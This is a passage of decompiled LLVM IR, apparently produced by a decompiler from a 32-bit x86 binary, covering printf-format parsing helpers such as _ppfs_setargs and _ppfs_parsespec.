  %v0_80522b0 = load i32, i32* @ebx, align 4
  %v1_80522b0 = inttoptr i32 %v0_80522b0 to i32*
  %v2_80522b0 = load i32, i32* %v1_80522b0, align 4
  %v4_80522b5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80522b5.backedge

dec_label_pc_80522b4:                             ; preds = %dec_label_pc_8052298, %dec_label_pc_8052293
  %v0_80522b4 = phi i32 [ %v1_8052298, %dec_label_pc_8052298 ], [ %v0_805229827, %dec_label_pc_8052293 ]
  %v1_80522b4 = add i32 %v0_80522b4, 1
  br label %dec_label_pc_80522b5.backedge

dec_label_pc_80522b5.backedge:                    ; preds = %dec_label_pc_80522b4, %dec_label_pc_80522b0
  %v4_80522b5.be = phi i32 [ %v4_80522b5.pre.pre, %dec_label_pc_80522b0 ], [ %v6_80522b529, %dec_label_pc_80522b4 ]
  %v0_8052298.be = phi i32 [ %v2_80522b0, %dec_label_pc_80522b0 ], [ %v1_80522b4, %dec_label_pc_80522b4 ]
  store i32 %v0_8052298.be, i32* %eax.global-to-local, align 4
  %v1_80522b5 = inttoptr i32 %v0_8052298.be to i8*
  %v2_80522b5 = load i8, i8* %v1_80522b5, align 1
  %v3_80522b5 = zext i8 %v2_80522b5 to i32
  %v5_80522b5 = and i32 %v4_80522b5.be, -256
  %v6_80522b5 = or i32 %v3_80522b5, %v5_80522b5
  store i32 %v6_80522b5, i32* %edx.global-to-local, align 4
  %v4_80522b7 = icmp eq i8 %v2_80522b5, 0
  %v1_80522b9 = icmp eq i1 %v4_80522b7, false
  br i1 %v1_80522b9, label %dec_label_pc_8052293, label %dec_label_pc_80522b5.dec_label_pc_80522bb_crit_edge

dec_label_pc_80522b5.dec_label_pc_80522bb_crit_edge: ; preds = %dec_label_pc_80522b5.backedge
  %v0_80522bb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80522bb

dec_label_pc_80522bb:                             ; preds = %dec_label_pc_80522b5.dec_label_pc_80522bb_crit_edge, %dec_label_pc_805228a
  %v0_80522bb = phi i32 [ %v0_80522bb.pre, %dec_label_pc_80522b5.dec_label_pc_80522bb_crit_edge ], [ %v0_805228a, %dec_label_pc_805228a ]
  %v1_80522bb = load i32, i32* @ebx, align 4
  %v2_80522bb = inttoptr i32 %v1_80522bb to i32*
  store i32 %v0_80522bb, i32* %v2_80522bb, align 4
  br label %dec_label_pc_80522bf

dec_label_pc_80522bf:                             ; preds = %dec_label_pc_805229e, %dec_label_pc_80522bb
  %storemerge = phi i32 [ 0, %dec_label_pc_80522bb ], [ -1, %dec_label_pc_805229e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_80522bf = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522bf, i32* @edx, align 4
  %v2_80522c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80522c0, i32* @ebx, align 4
  store i32 %v0_8052254, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_80522b5, { 1, 0 }
  uselistorder i8 %v2_80522b5, { 1, 2, 0 }
  uselistorder i32 %v0_8052298.be, { 2, 1, 0 }
  uselistorder i32 %v0_805229827, { 1, 0 }
  uselistorder i32 %v0_805228a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8052287, { 0, 2, 1 }
  uselistorder i32 %v1_8052284, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_80522bf, { 1, 0 }
  uselistorder label %dec_label_pc_8052293, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80522c4 = load i32, i32* @esi, align 4
  %v0_80522c5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80522d1 = add i32 %arg1, 24
  %v2_80522d1 = inttoptr i32 %v1_80522d1 to i32*
  %v3_80522d1 = load i32, i32* %v2_80522d1, align 4
  %v2_80522d4 = add i32 %arg1, 76
  %v3_80522d4 = inttoptr i32 %v2_80522d4 to i32*
  store i32 %arg2, i32* %v3_80522d4, align 4
  %tmp8 = icmp slt i32 %v3_80522d1, 1
  br i1 %tmp8, label %dec_label_pc_8052302, label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %entry
  %v1_80522de = load i32, i32* @ebx, align 4
  %v2_80522de = add i32 %v1_80522de, 28
  %v3_80522de = inttoptr i32 %v2_80522de to i32*
  store i32 %v3_80522d1, i32* %v3_80522de, align 4
  %v0_80522e1 = load i32, i32* @ebx, align 4
  %v1_80522e1 = add i32 %v0_80522e1, 24
  %v2_80522e1 = inttoptr i32 %v1_80522e1 to i32*
  store i32 0, i32* %v2_80522e1, align 4
  %v0_80522e8 = load i32, i32* @ebx, align 4
  %v1_80522e8 = add i32 %v0_80522e8, 4
  %v2_80522e8 = inttoptr i32 %v1_80522e8 to i32*
  store i32 0, i32* %v2_80522e8, align 4
  %v0_80522ef = load i32, i32* @ebx, align 4
  %v1_80522ef = add i32 %v0_80522ef, 8
  %v2_80522ef = inttoptr i32 %v1_80522ef to i32*
  store i32 0, i32* %v2_80522ef, align 4
  %v0_80522f6 = load i32, i32* @ebx, align 4
  %v1_80522f7 = call i32 @_ppfs_setargs(i32 %v0_80522f6)
  %v1_80522fc = load i32, i32* @ebx, align 4
  %v2_80522fc = add i32 %v1_80522fc, 24
  %v3_80522fc = inttoptr i32 %v2_80522fc to i32*
  store i32 %v3_80522d1, i32* %v3_80522fc, align 4
  br label %dec_label_pc_8052302

dec_label_pc_8052302:                             ; preds = %entry, %dec_label_pc_80522db
  %v2_8052302 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80522c5, i32* @ebx, align 4
  store i32 %v0_80522c4, i32* @esi, align 4
  ret i32 %v2_8052302

; uselistorder directives
  uselistorder i32 %v3_80522d1, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052302, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052309 = load i32, i32* @ebx, align 4
  store i32 %v0_8052309, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805230e = add i32 %arg1, 80
  store i32 %v1_805230e, i32* %ebx.global-to-local, align 4
  %v1_8052311 = add i32 %arg1, 24
  %v2_8052311 = inttoptr i32 %v1_8052311 to i32*
  %v3_8052311 = load i32, i32* %v2_8052311, align 4
  %v4_8052311 = icmp eq i32 %v3_8052311, 0
  %v1_8052315 = icmp eq i1 %v4_8052311, false
  %v1_80523cb = add i32 %arg1, 8
  %v2_80523cb = inttoptr i32 %v1_80523cb to i32*
  %v3_80523cb = load i32, i32* %v2_80523cb, align 4
  %v8_80523cb = icmp eq i32 %v3_80523cb, -2147483648
  %v1_80523d2 = icmp eq i1 %v8_80523cb, false
  br i1 %v1_8052315, label %dec_label_pc_80523cb, label %dec_label_pc_805231b

dec_label_pc_805231b:                             ; preds = %entry
  br i1 %v1_80523d2, label %dec_label_pc_8052335, label %dec_label_pc_8052324

dec_label_pc_8052324:                             ; preds = %dec_label_pc_805231b
  %v1_8052324 = add i32 %arg1, 76
  %v2_8052324 = inttoptr i32 %v1_8052324 to i32*
  %v3_8052324 = load i32, i32* %v2_8052324, align 4
  store i32 %v3_8052324, i32* %eax.global-to-local, align 4
  %v1_8052327 = add i32 %v3_8052324, 4
  store i32 %v1_8052327, i32* %edx.global-to-local, align 4
  store i32 %v1_8052327, i32* %v2_8052324, align 4
  %v0_805232d = load i32, i32* %eax.global-to-local, align 4
  %v1_805232d = inttoptr i32 %v0_805232d to i32*
  %v2_805232d = load i32, i32* %v1_805232d, align 4
  store i32 %v2_805232d, i32* %eax.global-to-local, align 4
  %v1_805232f = load i32, i32* @ecx, align 4
  %v2_805232f = add i32 %v1_805232f, 80
  %v3_805232f = inttoptr i32 %v2_805232f to i32*
  store i32 %v2_805232d, i32* %v3_805232f, align 4
  %v0_8052332 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052332 = load i32, i32* @ecx, align 4
  %v2_8052332 = add i32 %v1_8052332, 8
  %v3_8052332 = inttoptr i32 %v2_8052332 to i32*
  store i32 %v0_8052332, i32* %v3_8052332, align 4
  %v0_8052335.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052335

dec_label_pc_8052335:                             ; preds = %dec_label_pc_805231b, %dec_label_pc_8052324
  %v1_8052344 = phi i32 [ %arg1, %dec_label_pc_805231b ], [ %v0_8052335.pre, %dec_label_pc_8052324 ]
  %v1_8052335 = add i32 %v1_8052344, 4
  %v2_8052335 = inttoptr i32 %v1_8052335 to i32*
  %v3_8052335 = load i32, i32* %v2_8052335, align 4
  %v8_8052335 = icmp eq i32 %v3_8052335, -2147483648
  %v1_805233c = icmp eq i1 %v8_8052335, false
  br i1 %v1_805233c, label %dec_label_pc_805234f, label %dec_label_pc_805233e

dec_label_pc_805233e:                             ; preds = %dec_label_pc_8052335
  %v1_805233e = add i32 %v1_8052344, 76
  %v2_805233e = inttoptr i32 %v1_805233e to i32*
  %v3_805233e = load i32, i32* %v2_805233e, align 4
  store i32 %v3_805233e, i32* %eax.global-to-local, align 4
  %v1_8052341 = add i32 %v3_805233e, 4
  store i32 %v1_8052341, i32* %edx.global-to-local, align 4
  store i32 %v1_8052341, i32* %v2_805233e, align 4
  %v0_8052347 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052347 = inttoptr i32 %v0_8052347 to i32*
  %v2_8052347 = load i32, i32* %v1_8052347, align 4
  store i32 %v2_8052347, i32* %eax.global-to-local, align 4
  %v1_8052349 = load i32, i32* @ecx, align 4
  %v2_8052349 = add i32 %v1_8052349, 80
  %v3_8052349 = inttoptr i32 %v2_8052349 to i32*
  store i32 %v2_8052347, i32* %v3_8052349, align 4
  %v0_805234c = load i32, i32* %eax.global-to-local, align 4
  %v1_805234c = load i32, i32* @ecx, align 4
  %v2_805234c = add i32 %v1_805234c, 4
  %v3_805234c = inttoptr i32 %v2_805234c to i32*
  store i32 %v0_805234c, i32* %v3_805234c, align 4
  %v1_80523c417.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805234f

dec_label_pc_805234f:                             ; preds = %dec_label_pc_8052335, %dec_label_pc_805233e
  %v1_80523c417 = phi i32 [ %v1_8052344, %dec_label_pc_8052335 ], [ %v1_80523c417.pre, %dec_label_pc_805233e ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80523c418 = add i32 %v1_80523c417, 28
  %v3_80523c419 = inttoptr i32 %v2_80523c418 to i32*
  %v4_80523c420 = load i32, i32* %v3_80523c419, align 4
  %v5_80523c721 = icmp sgt i32 %v4_80523c420, 0
  br i1 %v5_80523c721, label %dec_label_pc_8052353, label %dec_label_pc_80523f9.loopexit

dec_label_pc_8052353:                             ; preds = %dec_label_pc_805234f, %dec_label_pc_80523c3
  %v1_80523c423 = phi i32 [ %v1_80523c4, %dec_label_pc_80523c3 ], [ %v1_80523c417, %dec_label_pc_805234f ]
  %v1_805235322 = phi i32 [ %v1_80523c3, %dec_label_pc_80523c3 ], [ 0, %dec_label_pc_805234f ]
  %v2_8052353 = mul i32 %v1_805235322, 4
  %v3_8052353 = add i32 %v2_8052353, 40
  %v4_8052353 = add i32 %v3_8052353, %v1_80523c423
  %v5_8052353 = inttoptr i32 %v4_8052353 to i32*
  %v6_8052353 = load i32, i32* %v5_8052353, align 4
  store i32 %v6_8052353, i32* %eax.global-to-local, align 4
  %v1_8052357 = add i32 %v6_8052353, -8
  %v9_8052357 = icmp eq i32 %v1_8052357, 0
  br i1 %v9_8052357, label %dec_label_pc_80523c3, label %dec_label_pc_805235c

dec_label_pc_805235c:                             ; preds = %dec_label_pc_8052353
  %v10_8052357 = icmp slt i32 %v1_8052357, 0
  %v6_8052357 = sub i32 7, %v6_8052353
  %v7_8052357 = and i32 %v6_8052357, %v6_8052353
  %v8_8052357 = icmp slt i32 %v7_8052357, 0
  %v1_805235c = add i32 %v1_80523c423, 76
  %v2_805235c = inttoptr i32 %v1_805235c to i32*
  %v3_805235c = load i32, i32* %v2_805235c, align 4
  store i32 %v3_805235c, i32* %edx.global-to-local, align 4
  %v3_805235f = icmp eq i1 %v10_8052357, %v8_8052357
  br i1 %v3_805235f, label %dec_label_pc_805236f, label %dec_label_pc_8052361

dec_label_pc_8052361:                             ; preds = %dec_label_pc_805235c
  %tmp15 = icmp slt i32 %v6_8052353, 3
  %v9_8052368 = icmp eq i32 %v6_8052353, 7
  %v1_805236b = icmp eq i1 %v9_8052368, false
  %or.cond = or i1 %tmp15, %v1_805236b
  br i1 %or.cond, label %dec_label_pc_80523b6, label %dec_label_pc_8052398

dec_label_pc_805236f:                             ; preds = %dec_label_pc_805235c
  %tmp16 = icmp sgt i32 %v6_8052353, 1024
  br i1 %tmp16, label %dec_label_pc_8052378, label %dec_label_pc_80523b6

dec_label_pc_8052378:                             ; preds = %dec_label_pc_805236f
  %v6_8052378 = icmp eq i32 %v6_8052353, 2048
  br i1 %v6_8052378, label %dec_label_pc_8052388, label %dec_label_pc_805237f

dec_label_pc_805237f:                             ; preds = %dec_label_pc_8052378
  %v9_805237f = icmp eq i32 %v6_8052353, 2055
  %v1_8052384 = icmp eq i1 %v9_805237f, false
  br i1 %v1_8052384, label %dec_label_pc_80523b6, label %dec_label_pc_80523a7

dec_label_pc_8052388:                             ; preds = %dec_label_pc_8052378
  %v1_8052388 = add i32 %v3_805235c, 8
  store i32 %v1_8052388, i32* %eax.global-to-local, align 4
  store i32 %v1_8052388, i32* %v2_805235c, align 4
  %v0_805238e = load i32, i32* %edx.global-to-local, align 4
  %v1_805238e = inttoptr i32 %v0_805238e to i32*
  %v2_805238e = load i32, i32* %v1_805238e, align 4
  store i32 %v2_805238e, i32* %eax.global-to-local, align 4
  %v1_8052390 = add i32 %v0_805238e, 4
  %v2_8052390 = inttoptr i32 %v1_8052390 to i32*
  %v3_8052390 = load i32, i32* %v2_8052390, align 4
  store i32 %v3_8052390, i32* %edx.global-to-local, align 4
  %v1_8052393 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052393 = add i32 %v1_8052393, 4
  %v3_8052393 = inttoptr i32 %v2_8052393 to i32*
  store i32 %v3_8052390, i32* %v3_8052393, align 4
  %v0_80523be.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80523be

dec_label_pc_8052398:                             ; preds = %dec_label_pc_8052361
  %v3_8052398 = load i32, i32* %v2_805235c, align 4
  store i32 %v3_8052398, i32* %edx.global-to-local, align 4
  %v1_805239b = add i32 %v3_8052398, 8
  store i32 %v1_805239b, i32* %eax.global-to-local, align 4
  store i32 %v1_805239b, i32* %v2_805235c, align 4
  %v0_80523a1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523a1 = inttoptr i32 %v0_80523a1 to double*
  %v2_80523a1 = load double, double* %v1_80523a1, align 4
  %v2_80523a3 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80523a3 = inttoptr i32 %v2_80523a3 to double*
  store double %v2_80523a1, double* %v4_80523a3, align 4
  br label %dec_label_pc_80523c0

dec_label_pc_80523a7:                             ; preds = %dec_label_pc_805237f
  %v3_80523a7 = load i32, i32* %v2_805235c, align 4
  store i32 %v3_80523a7, i32* %edx.global-to-local, align 4
  %v1_80523aa = add i32 %v3_80523a7, 12
  store i32 %v1_80523aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80523aa, i32* %v2_805235c, align 4
  %v0_80523b0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80523b0 = inttoptr i32 %v0_80523b0 to x86_fp80*
  %v2_80523b0 = load x86_fp80, x86_fp80* %v1_80523b0, align 4
  %v2_80523b2 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80523b2 = inttoptr i32 %v2_80523b2 to x86_fp80*
  store x86_fp80 %v2_80523b0, x86_fp80* %v3_80523b2, align 4
  br label %dec_label_pc_80523c0

dec_label_pc_80523b6:                             ; preds = %dec_label_pc_8052361, %dec_label_pc_805236f, %dec_label_pc_805237f
  %v1_80523b6 = add i32 %v3_805235c, 4
  store i32 %v1_80523b6, i32* %eax.global-to-local, align 4
  store i32 %v1_80523b6, i32* %v2_805235c, align 4
  %v0_80523bc = load i32, i32* %edx.global-to-local, align 4
  %v1_80523bc = inttoptr i32 %v0_80523bc to i32*
  %v2_80523bc = load i32, i32* %v1_80523bc, align 4
  store i32 %v2_80523bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80523be

dec_label_pc_80523be:                             ; preds = %dec_label_pc_8052388, %dec_label_pc_80523b6
  %v0_80523be = phi i32 [ %v0_80523be.pre, %dec_label_pc_8052388 ], [ %v2_80523bc, %dec_label_pc_80523b6 ]
  %v1_80523be = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523be = inttoptr i32 %v1_80523be to i32*
  store i32 %v0_80523be, i32* %v2_80523be, align 4
  %v0_80523c0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80523c0

dec_label_pc_80523c0:                             ; preds = %dec_label_pc_80523a7, %dec_label_pc_8052398, %dec_label_pc_80523be
  %v0_80523c0 = phi i32 [ %v2_80523b2, %dec_label_pc_80523a7 ], [ %v2_80523a3, %dec_label_pc_8052398 ], [ %v0_80523c0.pre, %dec_label_pc_80523be ]
  %v1_80523c0 = add i32 %v0_80523c0, 12
  store i32 %v1_80523c0, i32* %ebx.global-to-local, align 4
  %v0_80523c3.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80523c4.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80523c3

dec_label_pc_80523c3:                             ; preds = %dec_label_pc_8052353, %dec_label_pc_80523c0
  %v1_80523c4 = phi i32 [ %v1_80523c423, %dec_label_pc_8052353 ], [ %v1_80523c4.pre, %dec_label_pc_80523c0 ]
  %v0_80523c3 = phi i32 [ %v1_805235322, %dec_label_pc_8052353 ], [ %v0_80523c3.pre, %dec_label_pc_80523c0 ]
  %v1_80523c3 = add i32 %v0_80523c3, 1
  store i32 %v1_80523c3, i32* %esi.global-to-local, align 4
  %v2_80523c4 = add i32 %v1_80523c4, 28
  %v3_80523c4 = inttoptr i32 %v2_80523c4 to i32*
  %v4_80523c4 = load i32, i32* %v3_80523c4, align 4
  %v5_80523c7 = icmp slt i32 %v1_80523c3, %v4_80523c4
  br i1 %v5_80523c7, label %dec_label_pc_8052353, label %dec_label_pc_80523f9.loopexit

dec_label_pc_80523cb:                             ; preds = %entry
  br i1 %v1_80523d2, label %dec_label_pc_80523e2, label %dec_label_pc_80523d4

dec_label_pc_80523d4:                             ; preds = %dec_label_pc_80523cb
  %v1_80523d4 = add i32 %arg1, 36
  %v2_80523d4 = inttoptr i32 %v1_80523d4 to i8*
  %v3_80523d4 = load i8, i8* %v2_80523d4, align 1
  %v2_80523d8 = zext i8 %v3_80523d4 to i32
  %v3_80523d8 = mul nuw nsw i32 %v2_80523d8, 12
  store i32 %v3_80523d8, i32* %eax.global-to-local, align 4
  %v2_80523db = add i32 %arg1, 68
  %v3_80523db = add i32 %v2_80523db, %v3_80523d8
  %v4_80523db = inttoptr i32 %v3_80523db to i32*
  %v5_80523db = load i32, i32* %v4_80523db, align 4
  store i32 %v5_80523db, i32* %eax.global-to-local, align 4
  store i32 %v5_80523db, i32* %v2_80523cb, align 4
  %v0_80523e2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80523e2

dec_label_pc_80523e2:                             ; preds = %dec_label_pc_80523cb, %dec_label_pc_80523d4
  %v1_80523f6 = phi i32 [ %arg1, %dec_label_pc_80523cb ], [ %v0_80523e2.pre, %dec_label_pc_80523d4 ]
  %v1_80523e2 = add i32 %v1_80523f6, 4
  %v2_80523e2 = inttoptr i32 %v1_80523e2 to i32*
  %v3_80523e2 = load i32, i32* %v2_80523e2, align 4
  %v8_80523e2 = icmp eq i32 %v3_80523e2, -2147483648
  %v1_80523e9 = icmp eq i1 %v8_80523e2, false
  br i1 %v1_80523e9, label %dec_label_pc_80523f9, label %dec_label_pc_80523eb

dec_label_pc_80523eb:                             ; preds = %dec_label_pc_80523e2
  %v1_80523eb = add i32 %v1_80523f6, 37
  %v2_80523eb = inttoptr i32 %v1_80523eb to i8*
  %v3_80523eb = load i8, i8* %v2_80523eb, align 1
  %v2_80523ef = zext i8 %v3_80523eb to i32
  %v3_80523ef = mul nuw nsw i32 %v2_80523ef, 12
  store i32 %v3_80523ef, i32* %eax.global-to-local, align 4
  %v1_80523f2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80523f2 = add nsw i32 %v3_80523ef, -12
  %v3_80523f2 = add i32 %v2_80523f2, %v1_80523f2
  %v4_80523f2 = inttoptr i32 %v3_80523f2 to i32*
  %v5_80523f2 = load i32, i32* %v4_80523f2, align 4
  store i32 %v5_80523f2, i32* %eax.global-to-local, align 4
  store i32 %v5_80523f2, i32* %v2_80523e2, align 4
  %v0_80523f9.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80523f9

dec_label_pc_80523f9.loopexit:                    ; preds = %dec_label_pc_80523c3, %dec_label_pc_805234f
  %v1_80523c4.lcssa = phi i32 [ %v1_80523c417, %dec_label_pc_805234f ], [ %v1_80523c4, %dec_label_pc_80523c3 ]
  br label %dec_label_pc_80523f9

dec_label_pc_80523f9:                             ; preds = %dec_label_pc_80523f9.loopexit, %dec_label_pc_80523e2, %dec_label_pc_80523eb
  %v10_8052400 = phi i32 [ %v1_80523c4.lcssa, %dec_label_pc_80523f9.loopexit ], [ %v1_80523f6, %dec_label_pc_80523e2 ], [ %v0_80523f9.pre, %dec_label_pc_80523eb ]
  %v1_80523f9 = add i32 %v10_8052400, 8
  %v2_80523f9 = inttoptr i32 %v1_80523f9 to i32*
  %v3_80523f9 = load i32, i32* %v2_80523f9, align 4
  store i32 %v3_80523f9, i32* %eax.global-to-local, align 4
  %v2_80523fc = icmp slt i32 %v3_80523f9, 0
  %v1_80523fe = icmp eq i1 %v2_80523fc, false
  br i1 %v1_80523fe, label %dec_label_pc_8052414, label %dec_label_pc_8052400

dec_label_pc_8052400:                             ; preds = %dec_label_pc_80523f9
  %v1_8052400 = add i32 %v10_8052400, 16
  %v2_8052400 = inttoptr i32 %v1_8052400 to i32*
  %v3_8052400 = load i32, i32* %v2_8052400, align 4
  %v4_8052400 = or i32 %v3_8052400, 8
  store i32 %v4_8052400, i32* %v2_8052400, align 4
  %v0_8052404 = load i32, i32* @ecx, align 4
  %v1_8052404 = add i32 %v0_8052404, 16
  %v2_8052404 = inttoptr i32 %v1_8052404 to i32*
  %v3_8052404 = load i32, i32* %v2_8052404, align 4
  %v4_8052404 = and i32 %v3_8052404, -2
  store i32 %v4_8052404, i32* %v2_8052404, align 4
  %v0_8052408 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052408 = sub i32 0, %v0_8052408
  store i32 %v1_8052408, i32* %eax.global-to-local, align 4
  %v1_805240a = load i32, i32* @ecx, align 4
  %v2_805240a = add i32 %v1_805240a, 8
  %v3_805240a = inttoptr i32 %v2_805240a to i32*
  store i32 %v1_8052408, i32* %v3_805240a, align 4
  %v0_805240d = load i32, i32* @ecx, align 4
  %v1_805240d = add i32 %v0_805240d, 20
  %v2_805240d = inttoptr i32 %v1_805240d to i32*
  store i32 32, i32* %v2_805240d, align 4
  %v0_8052416.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052414

dec_label_pc_8052414:                             ; preds = %dec_label_pc_80523f9, %dec_label_pc_8052400
  %v0_8052416 = phi i32 [ %v3_80523f9, %dec_label_pc_80523f9 ], [ %v0_8052416.pre, %dec_label_pc_8052400 ]
  %v2_8052414 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052414, i32* @ebx, align 4
  ret i32 %v0_8052416

; uselistorder directives
  uselistorder i32 %v3_80523ef, { 1, 0 }
  uselistorder i32 %v3_80523d8, { 1, 0 }
  uselistorder i32 %v1_80523c3, { 2, 1, 0 }
  uselistorder i32 %v1_80523c4, { 0, 2, 1 }
  uselistorder i32 %v3_805235c, { 1, 0, 2 }
  uselistorder i32* %v2_805235c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8052357, { 1, 0 }
  uselistorder i32 %v6_8052353, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805235322, { 1, 0 }
  uselistorder i1 %v1_80523d2, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_8052414, { 1, 0 }
  uselistorder label %dec_label_pc_80523f9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80523e2, { 1, 0 }
  uselistorder label %dec_label_pc_80523c3, { 1, 0 }
  uselistorder label %dec_label_pc_80523c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80523be, { 1, 0 }
  uselistorder label %dec_label_pc_80523b6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052353, { 1, 0 }
  uselistorder label %dec_label_pc_805234f, { 1, 0 }
  uselistorder label %dec_label_pc_8052335, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8052418 = load i32, i32* @eax, align 4
  br label %dec_label_pc_805241f

dec_label_pc_805241f:                             ; preds = %dec_label_pc_805241f, %entry
  %v0_805241f = phi i32 [ ptrtoint (i8** @global_var_805d08a.928 to i32), %entry ], [ %v1_805241f, %dec_label_pc_805241f ]
  %v1_805241f = add i32 %v0_805241f, -2
  %v1_8052422 = inttoptr i32 %v1_805241f to i16*
  %v2_8052422 = load i16, i16* %v1_8052422, align 2
  %v3_8052422 = sext i16 %v2_8052422 to i32
  %v12_8052425 = icmp ne i32 %v3_8052422, %v0_8052418
  %v6_805242f = icmp ugt i32 %v1_805241f, ptrtoint (i32* @global_var_805d072.929 to i32)
  %or.cond = and i1 %v6_805242f, %v12_8052425
  br i1 %or.cond, label %dec_label_pc_805241f, label %dec_label_pc_8052431

dec_label_pc_8052431:                             ; preds = %dec_label_pc_805241f
  %.pre = add i32 %v0_805241f, -134598772
  %v2_8052437 = sdiv i32 %.pre, 2
  store i32 %v2_8052437, i32* @edx, align 4
  %v1_8052439 = add i32 %v2_8052437, ptrtoint (i8** @global_var_805d08a.928 to i32)
  %v2_8052439 = inttoptr i32 %v1_8052439 to i8*
  %v3_8052439 = load i8, i8* %v2_8052439, align 1
  %v4_8052439 = zext i8 %v3_8052439 to i32
  ret i32 %v4_8052439

; uselistorder directives
  uselistorder i32 %v2_8052437, { 1, 0 }
  uselistorder i32 %v1_805241f, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805d08a.928 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052442 = load i32, i32* @edi, align 4
  %v0_8052443 = load i32, i32* @esi, align 4
  %v0_8052444 = load i32, i32* @ebx, align 4
  store i32 %v0_8052444, i32* %stack_var_-16, align 4
  %v4_8052444 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8052470 = add i32 %tmp76, 24
  %v2_8052470 = inttoptr i32 %v1_8052470 to i32*
  %v3_8052470 = load i32, i32* %v2_8052470, align 4
  store i32 %v3_8052470, i32* %eax.global-to-local, align 4
  %v1_8052477 = add i32 %tmp76, 16
  %v2_8052477 = inttoptr i32 %v1_8052477 to i32*
  %v3_8052477 = load i32, i32* %v2_8052477, align 4
  %v1_805247a = and i32 %v3_8052477, 128
  %v2_805247a = icmp eq i32 %v1_805247a, 0
  store i32 %v1_805247a, i32* %edi.global-to-local, align 4
  %v1_8052480 = icmp eq i1 %v2_805247a, false
  br i1 %v1_8052480, label %dec_label_pc_8052493, label %dec_label_pc_8052482

dec_label_pc_8052482:                             ; preds = %entry
  %v2_8052482 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_80524e0.outer

dec_label_pc_805248d:                             ; preds = %dec_label_pc_805261b
  %v1_805248d = add i32 %v0_805261b.pre.pre, 1
  store i32 %v1_805248d, i32* @esi, align 4
  br label %dec_label_pc_805262b

dec_label_pc_8052493:                             ; preds = %entry
  %v15_8052445 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052495

